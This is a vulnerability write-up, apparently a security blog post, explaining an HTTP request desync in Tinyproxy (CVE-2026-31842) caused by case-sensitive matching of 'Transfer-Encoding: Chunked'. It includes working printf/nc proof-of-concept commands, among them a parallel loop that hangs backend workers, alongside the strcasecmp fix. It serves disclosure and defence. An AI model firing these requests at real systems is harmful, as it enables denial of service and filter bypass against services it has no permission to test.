---
title: "One capital letter: HTTP desync in Tinyproxy (CVE-2026-31842)"
date: 2026-08-14T11:00:00+05:00
tags: ["http-desync", "request-smuggling", "writeup", "cve"]
slug: "tinyproxy-transfer-encoding-desync"
translationKey: tinyproxy-desync
draft: false
summary: "Tinyproxy compares Transfer-Encoding with strcmp(), so `Chunked` slips past it while the backend honours it — a case-sensitivity bug that becomes request desync."
---

This one is a single character. Tinyproxy decides whether a request is chunked by comparing
the `Transfer-Encoding` header against the literal string `chunked` — with `strcmp()`, which
is case-sensitive. Send `Chunked` with a capital C and the proxy says "not chunked" while the
backend behind it says "chunked." That disagreement is a request desynchronization, and it's
tracked as **CVE-2026-31842**.

Unlike most of what ends up here, this one is public — there's a CVE and a
[public PoC](https://github.com/MuxammadiyevG/Vulns_POC/tree/main/CVE-2026-31842) — so nothing
is redacted. Full detail below.

## Background: why two parsers disagreeing is dangerous

A proxy sits between the client and the backend. Both of them read the same bytes off the same
connection and have to answer one question: **where does this request end and the next one
begin?** As long as they answer it the same way, everything is fine. The moment they answer it
differently, you have request smuggling.

HTTP gives two ways to mark where a body ends:

- **`Content-Length: N`** — the body is exactly N bytes.
- **`Transfer-Encoding: chunked`** — the body arrives in length-prefixed chunks and ends with a
  zero-length chunk (`0\r\n\r\n`).

If a request carries signals that can be read two ways, and the proxy trusts one while the
backend trusts the other, the two ends of the connection slice the byte stream at different
points. Bytes the proxy thinks are "the next request" get glued onto the previous one by the
backend — or the backend sits waiting for a body the proxy already decided wasn't coming. Both
outcomes are bad, in different ways.

## What chunked actually looks like

A normal chunked body:

```http
POST / HTTP/1.1
Host: backend
Transfer-Encoding: chunked

5\r\n
hello\r\n
0\r\n
\r\n
```

`5` says "five bytes coming," then `hello`, then `0` says "no more chunks." The server knows
the request is complete when it sees the `0`-length chunk. Take away the terminating `0\r\n\r\n`
and a server that believes the request is chunked will wait — forever, or until it times out —
for the rest of the body.

## The root cause

Tinyproxy decides "is this chunked?" in `src/reqs.c`:

```c
// src/reqs.c:815
return data ? !strcmp (data, "chunked") : 0;
```

`strcmp()` returns 0 only on an exact byte-for-byte match, so `!strcmp(data, "chunked")` is
true **only** for the exact lowercase string `chunked`. Feed it `Chunked`, `CHUNKED`, or
`cHuNkEd` and it returns non-zero — Tinyproxy concludes the request is *not* chunked.

That is the whole bug. RFC 7230 §4 is explicit that transfer-coding names are
case-insensitive; `Chunked` is a perfectly valid way to write it. A compliant backend — nginx,
Node's HTTP server, most everything — treats `Chunked` exactly like `chunked`. Tinyproxy does
not. The two now disagree about whether a body is even chunked.

```goat
                 Transfer-Encoding: Chunked
                            |
              .-------------+--------------.
              v                            v
        .-----------.                .-----------.
        | Tinyproxy |                |  backend  |
        | strcmp -> |                | case-ins  |
        | NOT       |                | IS        |
        | chunked   |                | chunked   |
        '-----------'                '-----------'
              |                            |
        reads body by             waits for chunks
        Content-Length            that never terminate
        or forwards as-is
```

## Consequence 1: security filter bypass

Anything that relies on Tinyproxy to understand the request body inherits Tinyproxy's blind
spot. A WAF or filter in front of — or built into — the proxy path makes its allow/block
decision on the body as *the proxy* framed it. If the proxy mis-frames a `Chunked` request,
the filter inspects the wrong bytes, and content that would have been blocked in a correctly
parsed request can ride through in the part the proxy misread. The capital letter is a way to
smuggle body content past inspection.

## Consequence 2: denial of service

This is the easy, reliable one. Send a request that says `Transfer-Encoding: Chunked` but
never actually sends a terminating chunk:

- The **backend** reads `Chunked` case-insensitively, believes a chunked body is coming, and
  blocks waiting for the `0\r\n\r\n` that never arrives.
- That backend worker is now stuck holding the connection open.

Repeat it. Each hung request pins a worker thread. With a small number of connections you
exhaust the backend's worker pool, and legitimate requests have nowhere to land — resource
starvation, no crash required.

## Proof of concept

**[Watch the PoC video](https://drive.google.com/file/d/14jDqzQhiIRUoYyca22zx9gANj3JwDEC2/view)** — the full run, proxy and backend side by side.

Two servers: a backend that speaks HTTP/1.1 chunked, and Tinyproxy in front of it.

**Backend** — a minimal Node server that prints when a request completes, so you can watch it
hang:

```js
// backend.js — listens on :9000
const http = require('http');
http.createServer((req, res) => {
  let n = 0;
  req.on('data', c => { n += c.length; });
  req.on('end', () => {           // fires only when the body is fully received
    console.log(`request complete, ${n} body bytes`);
    res.end('ok\n');
  });
}).listen(9000, () => console.log('backend on :9000'));
```

**Tinyproxy** — point it at the backend and run it on :8888 (an affected build, the one with
the `strcmp` at `src/reqs.c:815`).

**Baseline — lowercase `chunked`, no body terminator:**

```bash
printf 'POST / HTTP/1.1\r\nHost: 127.0.0.1:9000\r\nTransfer-Encoding: chunked\r\n\r\n' \
  | timeout 5 nc 127.0.0.1 8888
```

Tinyproxy reads this as chunked too, handles the framing itself, and the exchange resolves
cleanly. Consistent parsing, no desync.

**Exploit — capital `Chunked`, no body terminator:**

```bash
printf 'POST / HTTP/1.1\r\nHost: 127.0.0.1:9000\r\nTransfer-Encoding: Chunked\r\n\r\n' \
  | timeout 30 nc 127.0.0.1 8888
```

Now Tinyproxy's `strcmp` misses the capital `C`, so it does *not* treat the request as
chunked, and forwards it on. The backend *does* treat it as chunked and blocks waiting for
chunks that never come. Your `backend.js` never prints `request complete` — the connection
hangs until the timeout. That hang is the finding.

Fire a handful of these in parallel and watch the backend stop answering anything else:

```bash
for i in $(seq 1 20); do
  printf 'POST / HTTP/1.1\r\nHost: 127.0.0.1:9000\r\nTransfer-Encoding: Chunked\r\n\r\n' \
    | nc 127.0.0.1 8888 &
done
```

## The fix

One function call. Case-insensitive comparison, as the RFC has required all along:

```c
// before
return data ? !strcmp (data, "chunked") : 0;
// after
return data ? !strcasecmp (data, "chunked") : 0;
```

The general lesson outlives this one line: **any code that makes a security or framing decision
by string-comparing an HTTP header must do it case-insensitively.** Header field names and most
defined field values are case-insensitive by spec, and a proxy that forgets that will eventually
disagree with the server behind it. Disagreement between two HTTP parsers on the same connection
is never cosmetic — it's the raw material of request smuggling.

## Details

- **Vulnerability:** HTTP request desynchronization via case-sensitive `Transfer-Encoding`
  comparison
- **Component:** Tinyproxy, `src/reqs.c` (`strcmp` on the transfer-coding value)
- **Class:** CWE-444 — Inconsistent Interpretation of HTTP Requests
- **Impact:** security-filter bypass (body smuggled past inspection); denial of service (worker
  exhaustion via unterminated chunked bodies)
- **Fix:** `strcasecmp()` in place of `strcmp()`
- **CVE:** CVE-2026-31842
- **PoC:** <https://github.com/MuxammadiyevG/Vulns_POC/tree/main/CVE-2026-31842>
- **Video:** <https://drive.google.com/file/d/14jDqzQhiIRUoYyca22zx9gANj3JwDEC2/view>
